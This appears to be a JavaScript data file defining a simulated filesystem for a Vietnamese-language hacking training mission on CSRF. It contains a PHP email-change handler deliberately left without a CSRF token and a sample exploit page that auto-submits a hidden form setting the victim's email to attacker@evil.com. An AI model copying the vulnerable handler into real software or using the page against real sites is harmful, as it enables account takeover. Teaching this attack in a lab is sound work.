// Chương 6 — Mission 12: CSRF — đổi email nạn nhân không cần token.
// curl/HTML form là canned output. FS giữ source change-email.php (không CSRF token) + exploit.html mẫu.
export default {
  '/': { type: 'dir' },
  '/var': { type: 'dir' },
  '/var/www': { type: 'dir' },
  '/var/www/html': { type: 'dir' },
  '/var/www/html/change-email.php': {
    type: 'file',
    content: [
      '<?php',
      '// VULN: đổi email chỉ check session, KHÔNG check CSRF token -> request giả từ trang khác vẫn được tin',
      'session_start();',
      'if ($_SERVER["REQUEST_METHOD"] === "POST") {',
      '  $newEmail = $_POST["email"];',
      '  update_user_email($_SESSION["user_id"], $newEmail);',
      '  echo "Email updated to " . $newEmail;',
      '}',
      '?>',
    ].join('\n'),
  },
  '/home': { type: 'dir' },
  '/home/hacker': { type: 'dir' },
  '/home/hacker/exploit.html': {
    type: 'file',
    content: [
      '<!-- Trang giả mày sẽ host, dụ nạn nhân (đang login) mở -->',
      '<html><body onload="document.forms[0].submit()">',
      '  <form action="http://target/change-email.php" method="POST">',
      '    <input type="hidden" name="email" value="attacker@evil.com">',
      '  </form>',
      '</body></html>',
    ].join('\n'),
  },
  '/home/hacker/target.txt': { type: 'file', content: 'Endpoint: http://target/change-email.php — đổi email user, không thấy CSRF token nào trong form.' },
};
